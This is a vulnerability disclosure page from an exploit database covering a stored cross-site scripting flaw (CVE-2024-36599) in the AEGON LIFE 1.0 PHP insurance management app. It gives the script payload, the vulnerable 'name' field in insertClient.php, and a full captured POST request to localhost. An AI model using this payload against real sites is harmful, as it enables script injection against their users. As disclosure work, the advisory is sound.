---
title: AEGON LIFE 1.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024060034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-16
fetch_date: 2025-10-06T16:54:27.035083
---

# AEGON LIFE 1.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AEGON LIFE 1.0 Cross Site Scripting** **2024.06.15**  Credit:  **[Aslam Anwar Mahimkar](https://cxsecurity.com/author/Aslam%2BAnwar%2BMahimkar/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-36599](https://cxsecurity.com/cveshow/CVE-2024-36599/ "Click to see CVE-2024-36599")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Life Insurance Management Stored System- cross-site scripting (XSS)
# Exploit Author: Aslam Anwar Mahimkar
# Date: 18-05-2024
# Category: Web application
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/life-insurance-management-system-in-php/
# Version: AEGON LIFE v1.0
# Tested on: Linux
# CVE: CVE-2024-36599
# Description:
----------------
A stored cross-site scripting (XSS) vulnerability in Aegon Life v1.0 allows attackers to execute arbitrary web scripts via a crafted payload injected into the name parameter at insertClient.php.
# Payload:
----------------
<script>alert(document.domain)</script>
# Attack Vectors:
-------------------------
To exploit this vulnerability use <script>alert(document.domain)</script> when user visit Client.php we can see the XSS.
# Burp Suite Request:
----------------------------
POST /lims/insertClient.php HTTP/1.1
Host: localhost
Content-Length: 30423
Cache-Control: max-age=0
sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymKfAe0x95923LzQH
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/lims/addClient.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=v6g7shnk1mm5vq6i63lklck78n
Connection: close
------WebKitFormBoundarymKfAe0x95923LzQH
Content-Disposition: form-data; name="client\_id"
1716051159
------WebKitFormBoundarymKfAe0x95923LzQH
Content-Disposition: form-data; name="client\_password"
password
------WebKitFormBoundarymKfAe0x95923LzQH
Content-Disposition: form-data; name="name"
<script>alert(document.domain)</script>
------WebKitFormBoundarymKfAe0x95923LzQH
Content-Disposition: form-data; name="fileToUpload"; filename="runme.jpg\_original"
Content-Type: application/octet-stream
ÿØÿà

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top